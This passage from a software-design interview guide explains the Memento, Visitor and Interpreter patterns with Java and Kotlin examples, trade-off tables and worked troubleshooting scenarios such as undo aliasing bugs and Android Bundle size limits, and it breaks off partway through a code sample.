title: Memento, Visitor and Interpreter
scopeHtml: Scope: Memento, Visitor and Interpreter with refactors, double dispatch, Kotlin sealed classes, when not to use.

notes.title: Memento: the idea
notes.html:
Memento captures an object's internal state in a snapshot object, so it can be restored later, without breaking encapsulation. The object itself (the "originator") creates and reads the snapshot; other code (the "caretaker") just stores snapshots without peeking inside.

Use it for undo, checkpoints, "save game", form drafts, transaction rollback of in-memory objects.

+-------------+ creates +-----------+ stored by +-----------+
| Originator  |-------->| Memento   |<----------| Caretaker |
| (Editor)    |         | (snapshot)|           | (History) |
| save()      |<--------|  opaque   |           | list<M>   |
| restore(m)  | reads   +-----------+           +-----------+
+-------------+

Before: the history class reaches into the editor's fields.

class History { void save(Editor e) { saved.add(new String[]{e.text, String.valueOf(e.cursor)}); } }
// History knows Editor's private layout; adding a field (selection) breaks it.

After:

class Editor {
    private String text = ""; private int cursor;
    void type(String s) { text = text.substring(0, cursor) + s + text.substring(cursor); cursor += s.length(); }

    Snapshot save() { return new Snapshot(text, cursor); }          // memento created here
    void restore(Snapshot s) { this.text = s.text; this.cursor = s.cursor; }

    static final class Snapshot {                                    // opaque to outsiders
        private final String text; private final int cursor;
        private Snapshot(String t, int c) { text = t; cursor = c; }
    }
}
class History {
    private final Deque<Editor.Snapshot> stack = new ArrayDeque<>();
    void push(Editor.Snapshot s) { stack.push(s); }
    Editor.Snapshot pop() { return stack.pop(); }
}

Kotlin variant. An immutable data class is a natural memento:

data class EditorState(val text: String, val cursor: Int)
class Editor {
    var state = EditorState("", 0); private set
    fun type(s: String) { state = state.copy(text = state.text + s, cursor = state.cursor + s.length) }
    fun restore(s: EditorState) { state = s }
}
val history = ArrayDeque<EditorState>()
history += editor.state          // save
editor.restore(history.removeLast())

Real examples. Android onSaveInstanceState(Bundle) (the system is the caretaker; you are the originator); SavedStateHandle in ViewModels; Parcelable; database snapshots/backups; Git commits are snapshots of a tree; VM snapshots; game save files; browser form restore. Jetpack Compose rememberSaveable is a memento per composition.

Worked example (memory cost). A 100 KB document and 100 undo snapshots = 10 MB if full copies. Mitigations: snapshots only on boundaries (word/pause, not per key), limit the stack to 50, store diffs, or share immutable parts (structural sharing, as in persistent collections or Git's object store).

Decision gravity. Snapshot-based undo is simple and robust (no inverse logic) and reversible to change; its memory cost grows with state size. If you persist mementos, you commit to a stable serialised format: old saves must load after an app upgrade.

Everyday analogy. A video game save slot: the game writes a sealed file; you do not edit it by hand, you only load it back.

Common interview traps.

  • Memento exposing getters so the caretaker mutates it (breaks encapsulation).
  • Saving mutable references: the snapshot changes later. Copy deeply or use immutables.
  • onSaveInstanceState has a ~1 MB Binder transaction limit (TransactionTooLargeException); do not put bitmaps in it.

notes.title: When NOT to use Memento, and Command-undo vs Memento
notes.html:
Skip Memento when:

  • State is huge and changes are tiny (use Command inverse/deltas).
  • The state includes external resources that cannot be restored (open sockets, files, sent emails).
  • A transactional database already gives you rollback.
Command (inverse) Memento (snapshot)
Memory small proportional to state
Complexity each command needs a correct undo one generic restore
Works for irreversible ops no only for in-memory state
Typical use text editing, drawing ops game save, form state, small objects

Real-world hybrid. Photoshop and IDEs keep deltas plus periodic checkpoints: restoring the nearest checkpoint then replaying deltas bounds both memory and time.

Everyday analogy. Photocopying the whole page before each edit (Memento) versus writing down "I crossed out line 3" (Command).

Common interview traps.

  • Choosing Memento for a 500 MB model.
  • Forgetting to bound history length.

notes.title: Visitor: the idea
notes.html:
Visitor lets you add new operations to a set of classes without editing those classes. You put the operation in a separate visitor object that has one method per element type. Elements have an accept(visitor) method that calls the matching visit method.

The mechanism is double dispatch: Java chooses which method to call by the runtime type of one object only. accept makes the element call visitor.visit(this) with its own static type, so the right overload is picked by both the element's type and the visitor's type.

+-------------------+          +----------------------+
| <<interface>>     | accepts  | <<interface>>        |
| Shape             |--------->| ShapeVisitor         |
| accept(visitor)   |          | visit(Circle)        |
+---------+---------+          | visit(Rect)          |
          ^                    +----------+-----------+
     Circle  Rect                         ^
                                 AreaVisitor  DrawVisitor

Before: every new operation edits every class (or uses instanceof).

double area(Shape s) {
    if (s instanceof Circle c) return Math.PI * c.r * c.r;
    else if (s instanceof Rect r) return r.w * r.h;
    throw new IllegalArgumentException();
}
// export(Shape), draw(Shape), validate(Shape) ... each is another instanceof chain.

After:

interface Shape { <R> R accept(ShapeVisitor<R> v); }
interface ShapeVisitor<R> { R visit(Circle c); R visit(Rect r); }

class Circle implements Shape {
    final double r; Circle(double r) { this.r = r; }
    public <R> R accept(ShapeVisitor<R> v) { return v.visit(this); }
}
class Rect implements Shape {
    final double w, h; Rect(double w, double h) { this.w = w; this.h = h; }
    public <R> R accept(ShapeVisitor<R> v) { return v.visit(this); }
}
class AreaVisitor implements ShapeVisitor<Double> {
    public Double visit(Circle c) { return Math.PI * c.r * c.r; }
    public Double visit(Rect r)   { return r.w * r.h; }
}
// new Rect(3, 4).accept(new AreaVisitor()) -> 12.0

Adding PerimeterVisitor touches zero shape classes. Adding a new shape Triangle touches every visitor (the trade-off).

Kotlin variant: sealed classes make Visitor mostly unnecessary.

sealed interface Shape
data class Circle(val r: Double) : Shape
data class Rect(val w: Double, val h: Double) : Shape

fun area(s: Shape): Double = when (s) {          // exhaustive: compiler errors if a case is missing
    is Circle -> Math.PI * s.r * s.r
    is Rect   -> s.w * s.h
}
fun perimeter(s: Shape) = when (s) {
    is Circle -> 2 * Math.PI * s.r
    is Rect   -> 2 * (s.w + s.h)
}

Java 21 gives the same with sealed interfaces plus pattern-matching switch.

Real examples. Compilers and linters: ASTs (Abstract Syntax Trees) walked by visitors (Kotlin PSI KtVisitor, Java javax.lang.model ElementVisitor, ANTLR visitors, Error Prone/Lint checks). java.nio.file.FileVisitor with Files.walkFileTree. Annotation processors (KAPT/KSP KSVisitor). Android Lint detectors visiting UAST nodes. ASM bytecode ClassVisitor.

Decision gravity. Visitor fixes the element hierarchy and makes new operations cheap; sealed-class when has the same shape. It is a one-way door in the sense that the visitor interface lists every element type; every addition ripples to all visitors. Choose it only when the element set is stable and operations change often (the "expression problem").

Everyday analogy. A tax inspector visiting different shop types: one inspector, a different procedure per shop type, and shops need no new code to receive a new kind of inspector.

Common interview traps.

  • Explaining Visitor without double dispatch.
  • Not stating the downside: adding an element type breaks all visitors.
  • Not knowing sealed classes/pattern matching replace it in modern Kotlin/Java.

notes.title: When NOT to use Visitor
notes.html:
• The element hierarchy changes often. Every new type means editing every visitor.
  • Few operations (one or two). A polymorphic method on the classes is simpler.
  • Languages with pattern matching on sealed types (Kotlin, Java 21, Scala): use when/switch and let the compiler check exhaustiveness.
  • Elements keep private state the visitor needs. Visitor forces you to expose it, hurting encapsulation.

The expression problem in one table.

Change Easy with Hard with
Add a new operation Visitor / sealed when polymorphic methods (edit every class)
Add a new type polymorphic methods Visitor / sealed when (edit every operation)

Everyday analogy. A museum guide leaflet: new leaflets (operations) are cheap; adding a new exhibit means updating every leaflet.

Common interview traps.

  • Using Visitor on a two-class hierarchy.
  • Visitors that keep mutable state across calls and are reused across threads.

notes.title: Interpreter: the idea
notes.html:
Interpreter represents a small language as a class hierarchy (one class per grammar rule) and evaluates a sentence by walking its tree. It fits tiny, stable grammars: arithmetic, search filters, rules, permissions expressions, template syntax.

Parts: Expression interface with interpret(context), terminal expressions (numbers, variables), non-terminal expressions (add, and, or) holding child expressions, and a parser that builds the tree.

Expression: (a + 3) * 2 with a = 4

            Multiply
            /      \
         Add       Number(2)
        /    \
 Variable(a)  Number(3)

 evaluate: Add = 4 + 3 = 7; Multiply = 7 * 2 = 14

Before: string parsing and evaluation mixed with if chains and recursion in one method; hard to extend.

After:

interface Expr { int eval(Map<String, Integer> env); }

class Num implements Expr {
    final int v; Num(int v) { this.v = v; }
    public int eval(Map<String, Integer> env) { return v; }
}
class Var implements Expr {
    final String name; Var(String n) { name = n; }
    public int eval(Map<String, Integer> env) { return env.get(name); }
}
class Add implements Expr {
    final Expr l, r; Add(Expr l, Expr r) { this.l = l; this.r = r; }
    public int eval(Map<String, Integer> env) { return l.eval(env) + r.eval(env); }
}
class Mul implements Expr {
    final Expr l, r; Mul(Expr l, Expr r) { this.l = l; this.r = r; }
    public int eval(Map<String, Integer> env) { return l.eval(env) * r.eval(env); }
}
// Expr e = new Mul(new Add(new Var("a"), new Num(3)), new Num(2));
// e.eval(Map.of("a", 4)) -> 14

Kotlin variant (sealed class, recursive when):

sealed interface Expr
data class Num(val v: Int) : Expr
data class Var(val name: String) : Expr
data class Add(val l: Expr, val r: Expr) : Expr
data class Mul(val l: Expr, val r: Expr) : Expr

fun eval(e: Expr, env: Map<String, Int>): Int = when (e) {
    is Num -> e.v
    is Var -> env.getValue(e.name)
    is Add -> eval(e.l, env) + eval(e.r, env)
    is Mul -> eval(e.l, env) * eval(e.r, env)
}
println(eval(Mul(Add(Var("a"), Num(3)), Num(2)), mapOf("a" to 4)))  // 14

Real examples. Regular expressions (java.util.regex.Pattern compiles to a node graph), SQL WHERE clauses, Spring Expression Language (SpEL), Hibernate Criteria / JPA specifications, Kotlin DSL builders, feature-flag rule engines (country == IN and plan == "pro"), cron expression parsers, spreadsheets.

Worked example (rule engine). A promo rule: cart.total > 500 AND user.city IN ("Pune","Delhi"). Parse once into a tree (about 1 ms), cache it, and evaluate per request at about microseconds. Parsing on every request at 5,000 req/s would waste CPU; cache the compiled expression.

When NOT to use Interpreter.

  • Large grammars: the class explosion is unmaintainable; use a parser generator (ANTLR) or an embedded scripting language.
  • Performance-critical evaluation: tree walking is slower than compiled bytecode; compile to bytecode or lambdas.
  • Untrusted input expressions: a user-supplied script is a security risk (SpEL injection incidents). Sandbox or whitelist.

Decision gravity. Building a mini-language is a long-lived commitment: once customers write rules in it, the syntax is public API. Start with a data structure (JSON conditions) or composition of lambdas before inventing a grammar.

Everyday analogy. Sheet music: notation (grammar) turned into sound (evaluation) by a performer who walks the page left to right.

Common interview traps.

  • Claiming Interpreter is for "any language". It suits small, simple grammars.
  • Confusing Interpreter (evaluate a tree) with Visitor (add operations to a tree); they are often combined: the tree is Composite, evaluation can be a Visitor.
  • No cycle or depth limit: a deeply nested expression causes a StackOverflowError.

notes.title: Memento, Visitor and Interpreter together: a mini calculator with undo
notes.html:
A real design often combines these. A calculator app keeps an expression tree (Interpreter), offers several operations over it - evaluate, print, simplify (Visitor / sealed when) - and supports undo by snapshotting the immutable tree (Memento).

sealed interface Expr
data class Num(val v: Int) : Expr
data class Add(val l: Expr, val r: Expr) : Expr

fun print(e: Expr): String = when (e) { is Num -> "${e.v}"; is Add -> "(${print(e.l)} + ${print(e.r)})" }
fun eval(e: Expr): Int = when (e) { is Num -> e.v; is Add -> eval(e.l) + eval(e.r) }

class Calculator {
    var expr: Expr = Num(0); private set
    private val history = ArrayDeque<Expr>()
    fun set(e: Expr) { history.addLast(expr); expr = e }   // immutable trees: snapshot is free
    fun undo() { history.removeLastOrNull()?.let { expr = it } }
}

Because trees are immutable, the "snapshot" is just a reference: structural sharing means 100 undos cost 100 pointers, not 100 copies. That is why Redux, Elm and Compose state use immutable data for time-travel debugging.

Decision gravity. Immutability is the key enabling decision: it makes Memento nearly free and makes Visitor/Interpreter thread-safe. Reversing it later (making the tree mutable for speed) removes those benefits.

Everyday analogy. An architect's blueprint (tree) that you can inspect many ways (area, cost, safety) and archive each revision.

Common interview traps.

  • Snapshotting mutable objects by reference.
  • Printing and evaluating via instanceof chains instead of an exhaustive when.

notes.title: Summary
notes.html:
• Memento: sealed snapshot of an originator's state, stored by a caretaker, for undo/checkpoints. Android onSaveInstanceState/SavedStateHandle. Beware memory, mutable references and the ~1 MB Bundle limit.
  • Command-undo is small but needs inverses; Memento is generic but costs memory. Hybrids use deltas plus checkpoints.
  • Visitor: add operations without editing element classes via double dispatch; cost is that new element types ripple into every visitor (the expression problem). With Kotlin sealed classes or Java 21 pattern switch, an exhaustive when usually replaces it.
  • Interpreter: grammar rules as classes, a parsed tree evaluated recursively. Fine for tiny stable languages (rules, filters); use ANTLR or scripting for big ones, and cache parsed trees.
  • Don't use Visitor with frequently changing types, Interpreter for large grammars or untrusted scripts, Memento for huge state.
  • Immutability makes Memento, Visitor and Interpreter simple and thread-safe.

questions.promptHtml: What is the Memento pattern and who are the originator and the caretaker?

sections.label: Why interviewers ask this
sections.html: Checks whether you understand "snapshot without breaking encapsulation", not just "undo".

sections.label: 30-second answer
sections.html: Memento captures an object's internal state in a snapshot so it can be restored later. The originator creates and reads the snapshot; the caretaker only stores snapshots and never looks inside. That keeps the originator's private layout hidden, so adding a field changes only the originator.

sections.label: Deep explanation
sections.html:
Originator (Editor) --save()--> Memento (opaque) <--stored by-- Caretaker (History stack)
Originator <--restore(m)-----------------------------------------/

Without it, History reaches into Editor fields and breaks the moment a selection field is added. Real uses: Android onSaveInstanceState and SavedStateHandle, rememberSaveable, game saves, Git commits as tree snapshots.

sections.label: Code
sections.html:
Languages: Java, Kotlin

class Editor {
    private String text = ""; private int cursor;
    Snapshot save() { return new Snapshot(text, cursor); }
    void restore(Snapshot s) { this.text = s.text; this.cursor = s.cursor; }
    static final class Snapshot {
        private final String text; private final int cursor;
        private Snapshot(String t, int c) { text = t; cursor = c; }
    }
}
data class EditorState(val text: String, val cursor: Int)
class Editor {
    var state = EditorState("", 0); private set
    fun restore(s: EditorState) { state = s }
}
val history = ArrayDeque<EditorState>()
history += editor.state
editor.restore(history.removeLast())

sections.label: Common mistakes & traps
sections.html:
• Exposing getters on the memento so the caretaker can mutate it.
  • Capturing mutable references: the snapshot changes later.
  • Unbounded history.

sections.label: Follow-ups
sections.html:
1. Why a nested private class in Java? -> Only the originator can read its fields; the caretaker holds an opaque type.
  2. Memento vs Command undo? -> Snapshot (memory grows with state) vs inverse operation (small but each command needs a correct undo).
  3. If mementos are persisted? -> You commit to a stable serialised format; old saves must load after an upgrade.

sections.label: 3-YOE vs senior answer
sections.html: 3-YOE says "save and restore". Senior stresses encapsulation, immutability, bounding memory and the versioning cost of persisted snapshots.

sections.label: Production connection
sections.html: A draft feature restored an old snapshot after an app upgrade added a field and crashed on null; versioned snapshots fixed it.

questions.contextHtml:
A drawing app's undo "does not undo the last stroke". Reproduction: draw 3 strokes, undo twice, you still see strokes 2 and 3 modified. Code:

class Canvas {
    private final List<Stroke> strokes = new ArrayList<>();
    Memento save() { return new Memento(strokes); }
    void restore(Memento m) { strokes.clear(); strokes.addAll(m.strokes); }
    static class Memento { final List<Stroke> strokes; Memento(List<Stroke> s) { strokes = s; } }
}

Stroke has setColor() and addPoint(); the history stack holds 50 mementos.
questions.promptHtml: What is wrong and how do you fix it?

sections.label: What a weak answer looks like
sections.html: "The stack is out of order." Misses that all mementos share one mutable list and mutable strokes.

sections.label: Strong answer
sections.html:
1. Clarifying questions I'd ask: Are strokes mutable after being drawn? How big can a canvas be? Is the memento public?
  2. Immediate mitigation: Copy the list in save.
  3. Hypotheses, ranked: (a) memento keeps a reference to the live list, (b) restore clears that same list so the snapshot empties itself, (c) shallow copy still shares mutable Stroke objects.
  4. How I'd verify each: Unit test: save, mutate, restore, assert equality; identity check m.strokes == strokes.
  5. Root cause: The memento aliases the originator's mutable state, so strokes.clear() empties the memento too and strokes edited later change inside old snapshots.
  6. Fix: Make strokes immutable and copy the list:
Memento save() { return new Memento(List.copyOf(strokes)); }
record Stroke(Color color, List<Point> points) {}   // immutable, copy on edit
data class Stroke(val color: Int, val points: List<Point>)
fun save() = Memento(strokes.toList())     // strokes are immutable data classes
  1. Prevention: Test asserting a snapshot is unchanged after later edits; immutable domain types.
  2. Trade-offs & what I'd NOT do: I would not deep-copy everything on every stroke if memory matters; immutable strokes let snapshots share them (structural sharing) so each snapshot costs one list.

sections.label: Curveball follow-ups
sections.html:
• 100 snapshots of 10,000 strokes? -> A list copy is 10,000 references (about 80 KB), fine with shared immutable strokes; a deep copy would be ~100x more.
  • Strokes must stay mutable? -> Copy on write or snapshot only on boundaries.

sections.label: Senior war story
sections.html: An "undo" that passed single-step tests failed in the field because the snapshot aliased the live list; the bug was one missing copy.

sections.label: Scoring rubric
sections.html:
• No hire: blames the stack.
  • Hire: finds aliasing, copies list.
  • Strong hire: makes elements immutable and explains structural sharing.

questions.contextHtml:
An Android photo-editor crashes when the user rotates the phone or backgrounds the app after applying filters:

android.os.TransactionTooLargeException: data parcel size 1048920 bytes
  at android.app.servertransaction.ActivityTransactionItem...

Crashes affect 1.2% of sessions on mid-range phones. The activity does outState.putParcelable("bitmap", editedBitmap) and outState.putSerializable("history", undoStack) (a stack of 20 bitmaps). QA only tested with small images.
questions.promptHtml: What happened, and how should state be saved across configuration change and process death?

sections.label: What a weak answer looks like
sections.html: "Compress the bitmap" or catch the exception; misses that the Bundle is the wrong container.

sections.label: Strong answer
sections.html:
1. Clarifying questions I'd ask: Image sizes? Is the history needed after process death or only rotation? Where are originals stored?
  2. Immediate mitigation: Stop putting bitmaps in the Bundle; save only a file URI.
  3. Hypotheses, ranked: Bundle exceeded the Binder transaction limit (about 1 MB shared across all in-flight transactions: verify per device); red herring: the device memory.
  4. How I'd verify each: Log Parcel.dataSize() or use a debug tool that measures Bundle size; reproduce with a 12 MP image.
  5. Root cause: onSaveInstanceState is a memento handed to the system, which stores it through Binder; the Binder buffer is small and shared.
  6. Fix:
// ViewModel survives rotation; SavedStateHandle holds only small ids/URIs
class EditorVm(private val state: SavedStateHandle) : ViewModel() {
    var imageUri: Uri? get() = state["uri"]; set(v) { state["uri"] = v }
    val undoStack = ArrayDeque<EditCommand>()      // in memory, ops not bitmaps
}

Persist large data (the edit history as small operations, previews on disk) in files or Room. 7. Prevention: A test that rotates with a 4000x3000 image; a custom lint/review rule against bitmaps in Bundles. 8. Trade-offs & what I'd NOT do: I would not catch the exception and silently lose state; and I would not store full bitmaps for undo: store operations (Command deltas) plus a checkpoint on disk.

sections.label: Curveball follow-ups
sections.html:
• Rotation vs process death? -> ViewModel survives rotation only; SavedStateHandle/disk survive process death.
  • What survives an app upgrade? -> Only versioned persisted state.

sections.label: Senior war story
sections.html: Crashes appeared only on a phone batch with 12 MP cameras; moving state to files and URIs removed them.

sections.label: Scoring rubric
sections.html:
• No hire: compress and catch.
  • Hire: ViewModel plus small SavedStateHandle.
  • Strong hire: explains Binder limit, delta undo with disk checkpoint, and tests with large inputs.

questions.contextHtml: A CAD web app keeps a 40 MB model in memory. Undo is implemented as a full-copy Memento after every edit. Users do 300 edits per session. Metrics: heap at 12 GB per tab after 5 minutes of heavy editing; tab crashes at about 250 edits on 4 GB laptops. Each edit changes under 1 KB of the model. A teammate wants to cap history at 10 steps; product refuses ("designers need 200 steps").
questions.promptHtml: Redesign undo. Compare Memento and Command, and say what you would ship.

sections.label: What a weak answer looks like
sections.html: "Cap at 10" or "add more RAM".

sections.label: Strong answer
sections.html:
1. Clarifying questions I'd ask: Are all edits invertible? Is the model immutable-friendly? Is collaboration (shared edits) planned? Must undo survive reload?
  2. Immediate mitigation: Cap at 50 and snapshot on edit boundaries, not each mouse move.
  3. Hypotheses, ranked: Full copies dominate; tiny edits make deltas 40,000x smaller; irreversible operations need checkpoints.
  4. How I'd verify each: Heap profile; measure bytes changed per edit; count edit types.
  5. Root cause: Memory is proportional to state size times history length (40 MB x 300 = 12 GB).
  6. Fix: Hybrid: Command with deltas for edits (about 1 KB x 300 = 300 KB) plus a periodic full checkpoint every 25 edits; undo restores the nearest checkpoint and replays deltas. For immutable sub-structures use structural sharing so snapshots share unchanged parts.
  7. Prevention: A budget metric (undo memory per session) and a test with 500 edits asserting a heap ceiling.
  8. Trade-offs & what I'd NOT do: I would not choose Command alone if some operations are not cleanly invertible (merge, boolean ops); there checkpoints are the safety net. I would not keep Mementos for external resources (uploaded files, sent emails).

sections.label: Curveball follow-ups
sections.html:
• Undo must survive reload? -> Persist deltas and checkpoints to IndexedDB with a versioned format.
  • Two users edit? -> Undo becomes per-user inverse operations over a shared log (OT/CRDT territory): say so and scope it.

sections.label: Senior war story
sections.html: Moving from per-edit copies to deltas plus checkpoints cut a heavy session from gigabytes to tens of megabytes with 200-step undo kept.

sections.label: Scoring rubric
sections.html:
• No hire: caps or adds memory.
  • Hire: proposes deltas.
  • Strong hire: hybrid with checkpoints, numbers shown, and non-invertible and external-resource limits.

questions.promptHtml: Explain the Visitor pattern and double dispatch. Why do we need accept?

sections.label: Why interviewers ask this
sections.html: Many candidates describe the diagram but cannot explain why accept exists.

sections.label: 30-second answer
sections.html: Visitor lets me add operations to a class hierarchy without editing the classes. The operation lives in a visitor object with one visit method per element type. Java picks an overload by the static type of the argument, so a call from outside sees only Shape. accept lets the element call visitor.visit(this) where this has its real static type, so the right method is chosen by two types: element and visitor. That is double dispatch.

sections.label: Deep explanation
sections.html:
shape.accept(areaVisitor)  -> Circle.accept: v.visit(this /*Circle*/)  -> AreaVisitor.visit(Circle)

Adding PerimeterVisitor touches zero shape classes; adding Triangle touches every visitor. That is the cost. Real uses: AST walkers (ANTLR, Kotlin PSI, Lint), FileVisitor with Files.walkFileTree, ASM ClassVisitor.

sections.label: Code
sections.html:
Languages: Java, Kotlin

interface Shape { <R> R accept(ShapeVisitor<R> v); }
interface ShapeVisitor<R> { R visit(Circle c); R visit(Rect r); }
class Circle implements Shape {
    final double r; Circle(double r) { this.r = r; }
    public <R> R accept(ShapeVisitor<R> v) { return v.visit(this); }
}
class AreaVisitor implements ShapeVisitor<Double> {
    public Double visit(Circle c) { return Math.PI * c.r * c.r; }
    public Double visit(Rect r)   { return r.w * r.h; }
}
sealed interface Shape
data class Circle(val r: Double) : Shape
data class Rect(val w: Double, val h: Double) : Shape
fun area(s: Shape): Double = when (s) {    // exhaustive, compiler checks
    is Circle -> Math.PI * s.r * s.r
    is Rect   -> s.w * s.h
}

sections.label: Common mistakes & traps
sections.html:
• Describing Visitor without double dispatch.
  • Not stating that new element types break every visitor.
  • Not knowing sealed when or Java 21 pattern-matching switch replace it.

sections.label: Follow-ups
sections.html:
1. Why not overload visit(Shape) and call it directly? -> The overload is chosen at compile time from the static type, so you get visit(Shape) always.
  2. What is the expression problem? -> Adding operations is easy with Visitor; adding types is easy with polymorphism; you cannot have both cheaply.
  3. How does a visitor carry results? -> A generic return type R, or a mutable visitor state (not thread-safe if shared).

sections.label: 3-YOE vs senior answer
sections.html: 3-YOE shows classes. Senior explains double dispatch, the cost, and when sealed when is simpler.

sections.label: Production connection
sections.html: A custom lint rule suite walked UAST nodes with visitors; new Kotlin syntax added node types and broke 12 detectors.

questions.contextHtml:
An invoice module has Item subtypes Product, Service, Discount. Four utility methods each do an instanceof chain: price(Item), toJson(Item), tax(Item), validate(Item). Every quarter, finance requests a new report operation (a toCsv, audit). Item types have not changed in 3 years.

double tax(Item i) {
    if (i instanceof Product p) return p.price * 0.18;
    else if (i instanceof Service s) return s.fee * 0.12;
    else if (i instanceof Discount d) return 0;
    throw new IllegalArgumentException();
}
questions.promptHtml: Which pattern fits, and what would you change? Show the Java and the Kotlin approach.

sections.label: What a weak answer looks like
sections.html: "Add a method tax() to each class" (ignores operations being the thing that changes) or names Strategy.

sections.label: Strong answer
sections.html:
1. Clarifying questions I'd ask: Which changes more, types or operations? Do operations need private state? Language level (Java 17/21, Kotlin)?
  2. Immediate mitigation: None needed; it is a maintainability refactor.
  3. Hypotheses, ranked: Operations change often, types are stable: Visitor (or sealed when). Polymorphic methods would force editing every class for each report.
  4. How I'd verify each: Count git history: operations added vs types added.
  5. Root cause: Operations scattered as instanceof chains with no compiler check for missing cases.
  6. Fix: Java 8-17:
interface ItemVisitor<R> { R visit(Product p); R visit(Service s); R visit(Discount d); }
class TaxVisitor implements ItemVisitor<Double> {
    public Double visit(Product p) { return p.price * 0.18; }
    public Double visit(Service s) { return s.fee * 0.12; }
    public Double visit(Discount d) { return 0.0; }
}

Kotlin or Java 21: sealed Item and an exhaustive when/switch:

sealed interface Item
fun tax(i: Item): Double = when (i) {
    is Product -> i.price * 0.18
    is Service -> i.fee * 0.12
    is Discount -> 0.0
}
  1. Prevention: Sealed hierarchy makes new types a compile error in every operation; tests per operation.
  2. Trade-offs & what I'd NOT do: I would not build a Visitor in Kotlin or Java 21: sealed when gives the same exhaustiveness with less ceremony. I would also keep a plain method if there were only one or two operations.

sections.label: Curveball follow-ups
sections.html:
• A new Subscription item is added? -> Visitor: compile errors in each visitor; sealed when: errors at each when; that is the point, find them all.
  • Visitors need Item private fields? -> Expose a minimal read API, or reconsider (encapsulation cost).

sections.label: Senior war story
sections.html: A missing Discount case in one instanceof chain silently skipped tax for months; the sealed version would not have compiled.

sections.label: Scoring rubric
sections.html:
• No hire: adds methods everywhere.
  • Hire: Visitor with double dispatch.
  • Strong hire: uses the expression-problem argument and picks sealed when for Kotlin and Java 21.

questions.promptHtml: When would you NOT use Visitor? Explain the expression problem.

sections.label: Why interviewers ask this
sections.html: Tests whether you know the cost, not just the mechanics.

sections.label: 30-second answer
sections.html: Visitor makes new operations cheap and new types expensive. If the element hierarchy changes often, every new type means editing every visitor, so I use plain polymorphism instead. With one or two operations a polymorphic method is simpler. With Kotlin sealed classes or Java 21 pattern switch, an exhaustive when does the job with compiler checks and no double dispatch. And if the visitor needs private state, Visitor forces me to expose it.

sections.label: Deep explanation
sections.html:
Change Easy with Hard with
Add an operation Visitor / sealed when polymorphic methods (edit every class)
Add a type polymorphic methods Visitor / sealed when (edit every operation)

Pick by what changes more. Decision gravity: the visitor interface lists every element type, so each addition ripples to all visitors; it is effectively a one-way door unless the element set is stable.

sections.label: Code
sections.html:
Languages: Java, Kotlin

// Java 21: sealed + pattern switch, no accept()
sealed interface Shape permits Circle, Rect {}
record Circle(double r) implements Shape {}
record Rect(double w, double h) implements Shape {}
static double area(Shape s) {
    return switch (s) {
        case Circle c -> Math.PI * c.r() * c.r();
        case Rect r   -> r.w() * r.h();
    };
}
fun perimeter(s: Shape) = when (s) {
    is Circle -> 2 * Math.PI * s.r
    is Rect   -> 2 * (s.w + s.h)
}

sections.label: Common mistakes & traps
sections.html:
• Using Visitor on a two-class hierarchy.
  • Visitors holding mutable state and reused across threads.
  • A default -> branch in a sealed when that hides the compile error for new types.

sections.label: Follow-ups
sections.html:
1. Can the expression problem be fully solved? -> Not cheaply in plain OOP; type classes, tagless final or open-ended designs trade other costs.
  2. Visitor with an open hierarchy (plugins add types)? -> Not suitable; use polymorphism or a registry keyed by type.
  3. Why avoid else/default in a sealed when? -> It silences exhaustiveness checks.

sections.label: 3-YOE vs senior answer
sections.html: 3-YOE says "Visitor adds operations". Senior says what changes more, names the cost and uses sealed types.

sections.label: Production connection
sections.html: A plugin system with third-party element types adopted Visitor; every plugin release broke the host's visitors.

questions.contextHtml: A document exporter uses NodeVisitor with visit(Paragraph), visit(Heading), visit(Image). There are 9 visitors (HTML, PDF, plain text, spell check, word count, accessibility, search index, ...). Product asks for a Table node and, next quarter, Video and Chart. Estimated effort: 9 visitors x 3 new nodes = 27 edits, and two visitors live in other teams' repos.
questions.promptHtml: What changes, what would you do about the cost, and what would you have designed differently?

sections.label: What a weak answer looks like
sections.html: "Just add the methods", with no thought to the ripple or the other teams.

sections.label: Strong answer
sections.html:
1. Clarifying questions I'd ask: Will more node types follow? Do other teams implement visitors? Must every visitor handle every node?
  2. Immediate mitigation: Provide a BaseNodeVisitor with a default visitUnknown(Node) to ship Table without breaking external teams.
  3. Hypotheses, ranked: Types now change more often than operations: the original Visitor premise is broken. Options: default methods; move to polymorphism (node.render(ctx)); sealed when within one codebase.
  4. How I'd verify each: Git history for node-type additions per year; check how many visitors need type-specific logic vs generic handling.
  5. Root cause: Visitor optimises for stable types; the domain turned out to be growing.
  6. Fix:
interface NodeVisitor<R> {
    R visit(Paragraph p); R visit(Heading h); R visit(Image i);
    default R visit(Table t) { return visitUnknown(t); }   // new: non-breaking
    R visitUnknown(Node n);
}

Long term, give Node a render-like polymorphic method for the common operations and keep visitors for rare analysis passes. 7. Prevention: Decide the axis of change up front; record it in the design doc; a test that every visitor handles all current node types. 8. Trade-offs & what I'd NOT do: I would not add a default for everything permanently; silent defaults hide missing handling (a spell-checker that skips Tables). Defaults are a migration tool, then make cases explicit.

sections.label: Curveball follow-ups
sections.html:
• Third-party visitors? -> Version the visitor interface; default methods give binary compatibility.
  • Is Kotlin sealed any better here? -> It turns the 27 edits into 27 compile errors: safer, same work.

sections.label: Senior war story
sections.html: The team shipped Table with a defaulted visitor method, and the accessibility checker silently ignored tables for a release; explicit handling found a real bug.

sections.label: Scoring rubric
sections.html:
• No hire: adds methods blindly.
  • Hire: identifies the broken premise.
  • Strong hire: staged migration, default-method trade-off and polymorphism for the hot axis.

questions.promptHtml: What is the Interpreter pattern and when is it a good fit?

sections.label: Why interviewers ask this
sections.html: Checks if you know it suits tiny grammars and how it relates to Composite and Visitor.

sections.label: 30-second answer
sections.html: Interpreter models a small language as a class hierarchy, one class per grammar rule, and evaluates a sentence by walking its tree. A parser builds the tree; each node has interpret(context). It fits small stable grammars: filters, rule expressions, permission checks. For big grammars I use ANTLR or an embedded scripting engine, and I cache parsed trees instead of reparsing each request.

sections.label: Deep explanation
sections.html:
(a + 3) * 2, a = 4:     Multiply
                        /      \
                     Add       Number(2)       Add = 4 + 3 = 7; Multiply = 14
                    /    \
             Var(a)  Number(3)

Terminals: numbers, variables. Non-terminals: add, and, or. The tree is a Composite; evaluation can be a Visitor. Real uses: regex Pattern, SQL WHERE, SpEL, JPA criteria, cron parsers, feature-flag rules.

sections.label: Code
sections.html:
Languages: Java, Kotlin

interface Expr { int eval(Map<String, Integer> env); }
class Num implements Expr { final int v; Num(int v){this.v=v;} public int eval(Map<String,Integer> e){ return v; } }
class Var implements Expr { final String n; Var(String n){this.n=n;} public int eval(Map<String,Integer> e){ return e.get(n); } }
class Add implements Expr {
